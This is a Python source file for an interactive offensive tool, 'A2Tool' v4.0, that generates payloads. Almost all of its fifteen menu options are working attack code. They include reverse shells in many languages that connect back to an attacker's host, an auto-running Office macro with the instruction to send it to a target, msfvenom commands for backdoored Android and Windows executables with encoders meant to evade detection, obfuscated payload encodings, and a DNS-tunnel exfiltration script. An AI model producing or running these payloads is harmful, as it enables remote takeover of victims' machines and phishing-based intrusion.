#!/usr/bin/env python3
"""
A2Tool v4.0 - Payload Generator Module (15 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time, base64, socket, random, string
from datetime import datetime
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    Style=Fore

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

def _run(cmd, shell=True, timeout=30):
    try: return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, timeout=timeout).decode('utf-8', errors='ignore')
    except: return ''

def menu():
    while True:
        print(f"\n{M}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{M}║{W}                 Payload Generator Suite                     {M}║{RS}")
        print(f"{M}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{M}║{W} [01]{R}  Windows Reverse Shell (PowerShell)                  {M}║{RS}")
        print(f"{M}║{W} [02]{R}  Linux Reverse Shell (Bash)                          {M}║{RS}")
        print(f"{M}║{W} [03]{R}  Python Reverse Shell                                {M}║{RS}")
        print(f"{M}║{W} [04]{R}  PHP Reverse Shell                                   {M}║{RS}")
        print(f"{M}║{W} [05]{R}  Perl Reverse Shell                                  {M}║{RS}")
        print(f"{M}║{W} [06]{R}  Node.js Reverse Shell                               {M}║{RS}")
        print(f"{M}║{W} [07]{R}  Ruby Reverse Shell                                  {M}║{RS}")
        print(f"{M}║{W} [08]{R}  Android Payload (APK) Generator                    {M}║{RS}")
        print(f"{M}║{W} [09]{R}  Windows Executable (PE) Payload                    {M}║{RS}")
        print(f"{M}║{W} [10]{R}  Macro Payload (Office Phishing)                    {M}║{RS}")
        print(f"{M}║{W} [11]{R}  One-Liner Payload Generator                        {M}║{RS}")
        print(f"{M}║{W} [12]{R}  Encrypted/Encoded Payload                          {M}║{RS}")
        print(f"{M}║{W} [13]{R}  Staged vs Stageless Payload                        {M}║{RS}")
        print(f"{M}║{W} [14]{R}  DNS Tunneling Payload                              {M}║{RS}")
        print(f"{M}║{W} [15]{R}  Metasploit Payload Generator (msfvenom)            {M}║{RS}")
        print(f"{M}║{W} [0]{R}   Back to Main Menu                                  {M}║{RS}")
        print(f"{M}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[Payload] » {RS}").strip()
        if ch == '0': break
        elif ch == '1': win_reverse_shell()
        elif ch == '2': linux_reverse_shell()
        elif ch == '3': python_reverse_shell()
        elif ch == '4': php_reverse_shell()
        elif ch == '5': perl_reverse_shell()
        elif ch == '6': node_reverse_shell()
        elif ch == '7': ruby_reverse_shell()
        elif ch == '8': android_payload()
        elif ch == '9': win_exe_payload()
        elif ch == '10': macro_payload()
        elif ch == '11': one_liner_generator()
        elif ch == '12': encrypted_payload()
        elif ch == '13': staged_payload()
        elif ch == '14': dns_tunnel_payload()
        elif ch == '15': msfvenom_wrapper()
        else: print(f"{R}[!] Invalid option{RS}")

def _get_lhost_lport():
    lhost = input(f"  {W}[?] LHOST (your IP): {RS}").strip()
    lport = input(f"  {W}[?] LPORT: {RS}").strip()
    return lhost, lport

def win_reverse_shell():
    """Tool 1: Windows PowerShell Reverse Shell"""
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{G}[+] Windows PowerShell Reverse Shell{RS}")
    
    payloads = [
        f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + "PS " + (pwd).Path + "> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()''',
        
        f'''powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
        
        f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n  {W}Payload {i}:{RS}")
        print(f"  {Y}{p[:200]}...{RS}")
    
    print(f"\n{G}[+] Save to shell.ps1 and run: powershell -ExecutionPolicy Bypass -File shell.ps1{RS}")
    print(f"{G}[+] Listener: nc -lvnp {lport}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def linux_reverse_shell():
    """Tool 2: Linux Bash Reverse Shell"""
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{G}[+] Linux Bash Reverse Shells{RS}")
    
    payloads = [
        f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
        f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        f"(sh)0>/dev/tcp/{lhost}/{lport} 1>&0 2>&0",
        f"/bin/bash -c 'sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n  {W}Payload {i}:{RS}")
        print(f"  {Y}{p}{RS}")
    
    print(f"\n{G}[+] Listener: nc -lvnp {lport}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def python_reverse_shell():
    """Tool 3: Python Reverse Shell"""
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{G}[+] Python Reverse Shells{RS}")
    
    payloads = [
        f'''python -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
' ''',
        f'''python3 -c "
import sys,socket,os,pty
s=socket.socket()
s.connect(('{lhost}',{lport}))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/sh')
" ''',
        f'python -c "exec(\\\"import socket,subprocess;s=socket.socket();s.connect((\\'{lhost}\\',{lport}));subprocess.call([\\'/bin/sh\\',\\'-i\\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\\\")"',
        f'''python -c '
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
' '''
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n  {W}Payload {i}:{RS}")
        print(f"  {Y}{p[:200]}{RS}")
    
    print(f"\n{G}[+] Listener: nc -lvnp {lport}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def php_reverse_shell():
    """Tool 4: PHP Reverse Shell"""
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{G}[+] PHP Reverse Shell{RS}")
    
    # Full PHP shell
    php_code = f'''<?php
set_time_limit(0);
$sock = fsockopen("{lhost}",{lport});
exec("/bin/sh -i <&3 >&3 2>&3");
?>'''
    
    payloads = [
        f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
        f'''php -r "
$s=fsockopen('{lhost}',{lport});
shell_exec('/bin/sh -i <&3 >&3 2>&3');
" ''',
        php_code
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n  {W}Payload {i}:{RS}")
        print(f"  {Y}{p[:300]}{RS}")
    
    # Save shell.php
    with open('shell.php', 'w') as f:
        f.write(php_code)
    print(f"\n{G}[+] shell.php saved{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def perl_reverse_shell():
    """Tool 5: Perl Reverse Shell"""
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{G}[+] Perl Reverse Shell{RS}")
    
    payloads = [
        f'''perl -e '
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
}};
' ''',
        f'''perl -MIO -e '
$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");
STDIN->fdopen($c,r);
$~->fdopen($c,w);
system$_ while<>;
' '''
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n  {W}Payload {i}:{RS}")
        print(f"  {Y}{p}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def node_reverse_shell():
    """Tool 6: Node.js Reverse Shell"""
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{G}[+] Node.js Reverse Shells{RS}")
    
    payloads = [
        f'''node -e '
var net = require("net");
var sh = require("child_process").exec("/bin/sh");
var client = new net.Socket();
client.connect({lport}, "{lhost}", function() {{
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
}});
' ''',
        f'''(function(){{
var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);
var client=new net.Socket();
client.connect({lport},"{lhost}",function(){{
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
}});
return /a/;
}})();''',
        f'''require("child_process").exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')'''
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n  {W}Payload {i}:{RS}")
        print(f"  {Y}{p[:200]}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def ruby_reverse_shell():
    """Tool 7: Ruby Reverse Shell"""
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{G}[+] Ruby Reverse Shells{RS}")
    
    payloads = [
        f'''ruby -rsocket -e '
c=TCPSocket.new("{lhost}",{lport});
while(cmd=c.gets);
IO.popen(cmd,"r"){{|io|c.print io.read}}
end
' ''',
        f'''ruby -rsocket -e '
exit if fork;c=TCPSocket.new("{lhost}",{lport});
while(cmd=c.gets);
IO.popen(cmd,"r"){{|io|c.print io.read}}
end
' ''',
        f'''ruby -e '
require "socket";
exit if fork;
c=TCPSocket.new("{lhost}","{lport}");
while(cmd=c.gets);
IO.popen(cmd,"r"){{|io|c.print io.read}}
end
' '''
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n  {W}Payload {i}:{RS}")
        print(f"  {Y}{p}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def android_payload():
    """Tool 8: Android Payload Generator"""
    print(f"\n{G}[+] Android Payload Generator (requires msfvenom){RS}")
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{W}Android Payload Options:{RS}")
    print(f"  1. Standard Android reverse TCP")
    print(f"  2. Android HTTPS payload")
    print(f"  3. Android with icon wrapping")
    
    ch = input(f"\n{Y}  Choice: {RS}").strip()
    
    if ch == '1':
        cmd = f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o a2tool.apk'
    elif ch == '2':
        cmd = f'msfvenom -p android/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -o a2tool.apk'
    elif ch == '3':
        apk = input(f"  {W}[?] Original APK to wrap: {RS}").strip()
        cmd = f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -x {apk} -o a2tool.apk'
    else:
        cmd = f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o a2tool.apk'
    
    print(f"\n{G}[+] Command: {cmd}{RS}")
    print(f"{G}[+] Payload: a2tool.apk{RS}")
    print(f"{Y}[!] Run msfvenom command to generate{RS}")
    print(f"{Y}[!] Listener: msfconsole -q -x 'use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'{RS}")
    
    run_now = input(f"\n{Y}[?] Generate now? (y/n): {RS}").strip().lower()
    if run_now == 'y':
        os.system(cmd)
        print(f"{G}[+] APK generated: a2tool.apk{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def win_exe_payload():
    """Tool 9: Windows Executable Payload"""
    print(f"\n{G}[+] Windows Executable Payload Generator (msfvenom){RS}")
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{W}Payload Types:{RS}")
    print(f"  1. windows/meterpreter/reverse_tcp")
    print(f"  2. windows/shell_reverse_tcp")
    print(f"  3. windows/meterpreter/reverse_https")
    print(f"  4. Custom")
    
    ch = input(f"\n{Y}  Choice: {RS}").strip()
    payloads_map = {'1': 'windows/meterpreter/reverse_tcp', '2': 'windows/shell_reverse_tcp', '3': 'windows/meterpreter/reverse_https'}
    payload = payloads_map.get(ch) or input(f"  {W}[?] Custom payload: {RS}").strip()
    
    out_file = input(f"  {W}[?] Output filename (default: payload.exe): {RS}").strip() or 'payload.exe'
    
    cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {out_file}'
    print(f"\n{G}[+] Command: {cmd}{RS}")
    
    # Also generate encoded version
    print(f"\n{W}Encoded variants:{RS}")
    print(f"  msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 5 -f exe -o {out_file}")
    print(f"  msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/xor_dynamic -i 3 -f exe -o {out_file}")
    print(f"  msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/call4_dword_xor -i 5 -f exe -o {out_file}")
    
    run_now = input(f"\n{Y}[?] Generate now? (y/n): {RS}").strip().lower()
    if run_now == 'y':
        os.system(cmd)
        print(f"{G}[+] Payload generated: {out_file}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def macro_payload():
    """Tool 10: Macro Payload (Office Phishing)"""
    print(f"\n{G}[+] Office Macro Payload Generator{RS}")
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    macro = f'''
Private Declare PtrSafe Function CreateProc Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, ByVal lpStartupInfo As Long, ByVal lpProcessInformation As Long) As Long

Sub AutoOpen()
    Dim str As String
    str = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"
    CreateProc 0, str, 0, 0, 0, 0, 0, 0, 0, 0
End Sub
'''
    
    print(f"\n{Y}[!] VBA Macro for Microsoft Office:{RS}")
    print(f"  {Y}{macro}{RS}")
    
    print(f"\n{W}Instructions:{RS}")
    print(f"  1. Create a new Word/Excel document")
    print(f"  2. Go to View → Macros → Create")
    print(f"  3. Paste the VBA code above")
    print(f"  4. Save as .docm or .xlsm")
    print(f"  5. Send to target and enable macros")
    print(f"  6. Listener: nc -lvnp {lport}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def one_liner_generator():
    """Tool 11: One-Liner Payload Generator"""
    print(f"\n{G}[+] One-Liner Payload Generator{RS}")
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{W}All-in-One Listener Payloads:{RS}")
    
    payloads = {
        'Bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        'Python': f"python -c 'import socket,subprocess;s=socket.socket();s.connect((\"{lhost}\",{lport}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
        'PHP': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'Ruby': f"ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        'Perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
        'Netcat': f"nc -e /bin/sh {lhost} {lport}",
        'Netcat (no -e)': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        'Telnet': f"rm -f /tmp/p; mknod /tmp/p p && telnet {lhost} {lport} 0/tmp/p",
        'Node.js': f"node -e 'require(\"net\").connect({lport},\"{lhost}\",function(){require(\"child_process\").exec(\"/bin/sh -i\",function(e,o){this.write(o)})})'",
        'PowerShell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"',
        'Socat': f"socat exec:'/bin/sh' tcp-connect:{lhost}:{lport}",
    }
    
    for lang, payload in payloads.items():
        print(f"\n  {W}{lang}:{RS}")
        print(f"  {Y}{payload}{RS}")
        print(f"  {'─'*60}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def encrypted_payload():
    """Tool 12: Encrypted/Encoded Payload"""
    print(f"\n{G}[+] Encrypted/Encoded Payload Generator{RS}")
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    # Base payload
    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    # Base64 encode
    b64 = base64.b64encode(payload.encode()).decode()
    
    print(f"\n{W}Original Payload:{RS}")
    print(f"  {Y}{payload}{RS}")
    
    print(f"\n{W}Base64 Encoded:{RS}")
    print(f"  echo {b64} | base64 -d | bash")
    
    print(f"\n{W}Base64 Python:{RS}")
    print(f"  python -c \"exec(base64.b64decode('{b64}'))\"")
    
    print(f"\n{W}XOR Encrypted (key=0xFF):{RS}")
    xored = ''.join(chr(ord(c) ^ 0xFF) for c in payload)
    xored_b64 = base64.b64encode(xored.encode()).decode()
    print(f"  python -c \"exec(''.join(chr(ord(c)^0xFF) for c in base64.b64decode('{xored_b64}')))\"")
    
    print(f"\n{W}Hex Encoded:{RS}")
    hex_enc = payload.encode().hex()
    print(f"  python -c \"exec(bytes.fromhex('{hex_enc}'))\"")
    
    print(f"\n{W}Double Base64:{RS}")
    double_b64 = base64.b64encode(base64.b64encode(payload.encode())).decode()
    print(f"  echo '{double_b64}' | base64 -d | base64 -d | bash")
    
    print(f"\n{W}AES Encrypted (requires pycryptodome):{RS}")
    print(f"  Use pycryptodome to encrypt: python -c \"from Crypto.Cipher import AES; ...\"")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def staged_payload():
    """Tool 13: Staged vs Stageless Payload"""
    print(f"\n{G}[+] Staged vs Stageless Payload Comparison{RS}")
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    print(f"\n{W}Staged Payloads (small downloader → full payload):{RS}")
    print(f"\n  {C}Windows Staged:{RS}")
    print(f"  msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o staged.exe")
    print(f"  msfvenom -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o staged_shell.exe")
    
    print(f"\n  {C}Linux Staged:{RS}")
    print(f"  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o staged.elf")
    print(f"  msfvenom -p linux/x64/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o staged64.elf")
    
    print(f"\n  {C}PHP Staged:{RS}")
    print(f"  msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o staged.php")
    
    print(f"\n{W}Stageless Payloads (self-contained):{RS}")
    print(f"\n  {C}Windows Stageless:{RS}")
    print(f"  msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o stageless.exe")
    print(f"  msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o stageless_meterp.exe")
    
    print(f"\n  {C}Linux Stageless:{RS}")
    print(f"  msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o stageless.elf")
    
    print(f"\n{Y}[!] Staged = smaller, requires connection back to msfconsole{RS}")
    print(f"{Y}[!] Stageless = larger, self-contained, more reliable{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def dns_tunnel_payload():
    """Tool 14: DNS Tunneling Payload"""
    print(f"\n{G}[+] DNS Tunneling Payload Generator{RS}")
    dns_server = input(f"  {W}[?] DNS Server IP (your controlled DNS): {RS}").strip()
    
    print(f"\n{W}DNS Tunneling Setup:{RS}")
    print(f"\n  1. Set up DNS server (dnsmasq/iodine):")
    echo(f"     iodine -f -P password {dns_server}")
    
    print(f"\n  2. Client connection:")
    print(f"     iodine -P password {dns_server}")
    
    print(f"\n  3. DNS tunnel payload:")
    print(f"""     #!/bin/bash
     # DNS Tunnel Reverse Shell
     while read cmd; do
       result=$(eval $cmd 2>&1)
       echo "$result" | while read line; do
         host -t TXT "$(echo $line | base64 -w0).{dns_server}" 2>/dev/null
       done
     done < /dev/tcp/localhost/9999""")
    
    print(f"\n{W}Tools for DNS Tunneling:{RS}")
    print(f"  {W}•{RS} iodine - https://github.com/yarrick/iodine")
    print(f"  {W}•{RS} dnscat2 - https://github.com/iagox86/dnscat2")
    print(f"  {W}•{RS} dns2tcp - https://github.com/alex-sector/dns2tcp")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def msfvenom_wrapper():
    """Tool 15: Metasploit Payload Generator Wrapper"""
    print(f"\n{G}[+] Metasploit Payload Generator (msfvenom wrapper){RS}")
    
    print(f"\n{W}Available payload formats:{RS}")
    formats = ['exe','elf','py','php','asp','aspx','jsp','war','pl','rb','ps1','vbs','msi','macho','apk','dmg','jar']
    print(f"  {', '.join(formats)}")
    
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    
    ptype = input(f"  {W}[?] Payload type (windows/linux/macos/android/php/python): {RS}").strip().lower()
    fmt = input(f"  {W}[?] Output format (exe/elf/py/php/asp/aspx): {RS}").strip() or 'exe'
    out = input(f"  {W}[?] Output filename: {RS}").strip() or f'payload.{fmt}'
    
    payload_map = {
        'windows': 'windows/meterpreter/reverse_tcp',
        'linux': 'linux/x64/meterpreter/reverse_tcp',
        'macos': 'osx/x64/meterpreter_reverse_tcp',
        'android': 'android/meterpreter/reverse_tcp',
        'php': 'php/meterpreter_reverse_tcp',
        'python': 'python/meterpreter_reverse_tcp',
    }
    
    payload = payload_map.get(ptype, 'windows/meterpreter/reverse_tcp')
    
    cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {out}'
    
    print(f"\n{G}[+] Command:{RS}")
    print(f"  {Y}{cmd}{RS}")
    
    run_now = input(f"\n{Y}[?] Generate now? (y/n): {RS}").strip().lower()
    if run_now == 'y':
        os.system(cmd)
        if os.path.exists(out):
            size = os.path.getsize(out)
            print(f"{G}[+] Payload generated: {out} ({size} bytes){RS}")
    
    print(f"\n{W}Listener command:{RS}")
    print(f"  msfconsole -q -x 'use multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
